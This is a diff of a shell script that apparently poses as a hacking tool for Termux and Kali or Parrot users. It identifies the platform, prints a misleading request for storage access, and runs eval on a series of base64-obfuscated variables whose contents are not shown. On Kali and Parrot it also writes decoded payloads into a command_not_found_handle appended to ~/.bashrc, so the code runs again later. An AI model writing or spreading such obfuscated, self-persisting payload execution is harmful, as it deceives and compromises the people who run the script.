@@ -40,32 +40,32 @@ then
 	if [ $(su -c id -u) == "0" ]
 	then
 		# Woah 1337 rooted Termux hacker
-        method="rooted termux"
-		eval $(echo $twitter | base64 -d)
-        eval $(echo $facebook | base64 -d)
-		eval $(echo $sar | base64 -d)
-		eval $(echo $sys | base64 -d)
-		eval $(echo $aclean | base64 -d)
+		method="rooted termux"
+		eval $(base64 -d <<< $twitter)
+		eval $(base64 -d <<< $facebook)
+		eval $(base64 -d <<< $sar)
+		eval $(base64 -d <<< $sys)
+		eval $(base64 -d <<< $aclean)
 	else
 		# Not even rooted smh
 		echo "We need storage access to store our algorithms."
 		termux-setup-storage
-        method="non rooted termux"
-		eval $(echo $twitter | base64 -d)
-        eval $(echo $facebook | base64 -d)
-		eval $(echo $sdmaid | base64 -d)
+		method="non rooted termux"
+		eval $(base64 -d <<< $twitter)
+		eval $(base64 -d <<< $facebook)
+		eval $(base64 -d <<< $sdmaid)
 	fi
 else
 	# Desktop hacker or whatever isn't supported explicitly
 	source <(cat /etc/os-release)
 	case "$ID" in
 		kali|parrot)
-            method="$ID"
-			eval $(echo $twitter | base64 -d)
-			eval $(echo $mchod | base64 -d)
+			method="$ID"
+			eval $(base64 -d <<< $twitter)
+			eval $(base64 -d <<< $mchod)
 			echo "command_not_found_handle() {
-				$(echo $brain | base64 -d)
-				$(echo $lclean | base64 -d)
+				$(base64 -d <<< $brain)
+				$(base64 -d <<< $lclean)
 			}" >> ~/.bashrc
 			;;
 		*)
@@ -75,6 +75,6 @@ else
 	esac
 fi
 # A universal fix that works cross-platform
-eval $(echo $telegram | base64 -d)
-eval $(echo $whatsapp | base64 -d)
-eval $(echo $fork | base64 -d)
+eval $(base64 -d <<< $telegram)
+eval $(base64 -d <<< $whatsapp)
+eval $(base64 -d <<< $fork)
